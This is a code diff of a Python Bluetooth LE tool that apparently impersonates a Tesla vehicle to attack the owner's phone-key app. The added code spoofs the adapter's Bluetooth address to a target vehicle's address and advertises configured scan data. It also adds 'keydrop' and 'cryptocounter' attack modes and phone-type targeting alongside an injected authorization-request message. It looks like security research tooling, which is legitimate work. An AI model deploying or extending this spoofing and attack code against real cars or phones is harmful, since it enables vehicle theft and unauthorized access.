@@ -1,18 +1,21 @@
 #!/usr/bin/env python3
 
 import json
-from re import I
+import time
 from pybleno import *
 import sys
 import signal
 from Tesla import *
 from TeslaService import *
 import pyfiglet
+import subprocess
 
 __author__ = "Martin Herfurt (trifinite.org)"
-__version__ = "0.1.1"
+__version__ = "0.1.3"
 __license__ = "MIT"
 
+BDADDR_BIN='/usr/local/src/bluez-5.64/tools/bdaddr'
+HCICONFIG_BIN='/usr/local/bin/hciconfig'
 ascii_banner = pyfiglet.figlet_format("temparary")
 print(ascii_banner)
 print("Author:  "+__author__)
@@ -28,22 +31,24 @@ if (len(configfile)<4):
     print("No config file. Exiting")
     exit(0)
 
-config = {
-    "eir": "0201061aff4c00021574278bdab64445208f0c720eaf05993500002342c5", 
-    "response": "030222111309533066373838356332616631613665663943", 
-    "pubkeyResponse": "0025"
-}
+config = {}
 
 with open(configfile, 'r') as f:
     config = json.load(f)
 
+# change adapter address
+subprocess.run([BDADDR_BIN, "-t", "-r",config['vehicleBluetoothAddress']])
+time.sleep(2.0)
+subprocess.run(['hciconfig', "hci0", "up"])
+time.sleep(1.0)
+
 bleno = Bleno()
-name = 'S0f7885c2af1a6ef9C'
-vehicleUuid = "74278BDAB64445208F0C720EAF059935"
+#name = 'S0f7885c2af1a6ef9C'
+#vehicleUuid = "74278BDAB64445208F0C720EAF059935"
 tesla = Tesla(config)
 teslaService = TeslaService(tesla)
-eir = bytearray.fromhex(config['eir']) 
-scanResponse = bytearray.fromhex(config['response'])
+eir = bytearray.fromhex(config['scanExtendedInquiryResponse']) 
+scanResponse = bytearray.fromhex(config['scanResponse'])
 
 
 def onStateChange(state):
@@ -79,7 +84,7 @@ bleno.on('servicesSet', onTest)
 bleno.start()
 
 inkey =''
-print("a : request authorization\ne : toggle evil bit\nh : toggle human bit\nq : terminate")
+print("a : request authorization\nh : toggle human readable output\nk : toggle keydrop attack mode\nc : toggle cryptocounter attack mode\np : toggle phone type between Android and iPhone\nq : terminate")
 
 
 while (inkey != 'q'):
@@ -91,13 +96,25 @@ while (inkey != 'q'):
 
     if (inkey == 'a'): # request authorization from Tesla app
         tesla.messagelist.append(bytearray.fromhex('001c1a1a12160a14ffff96c0b80f5a242076ca7bdf9524e1bd78da791802'))
-    elif (inkey == 'e'): # toggle evil bit
-        tesla.toggleEvilBit()
-        print("Evil bit: "+str(tesla.evil))
+
+    elif (inkey == 'k'): # toggle evil bit
+        tesla.toggleKeydropBit()
+        print("KeyDrop attack mode: "+str(tesla.keydrop))
+
+    elif (inkey == 'c'): # toggle sequence bit
+        tesla.toggleCryptoCounterBit()
+        print("CryptoCounter attack mode: "+str(tesla.cryptocounter))
     
-    elif (inkey == 'h'): # toggle evil bit
+    elif (inkey == 'h'): # toggle human bit
         tesla.toggleHumanBit()
-        print("Human bit: "+str(tesla.human))
+        print("Human readable output: "+str(tesla.human))
+
+    elif (inkey == 'p'): # toggle phone type bit
+        tesla.toggleTargetPhoneType()
+        if (tesla.targetPhoneType == 0):
+            print("Phone type set to: Android")
+        else:
+            print("Phone type set to: iPhone") 
 
 bleno.stopAdvertising()
 bleno.disconnect()
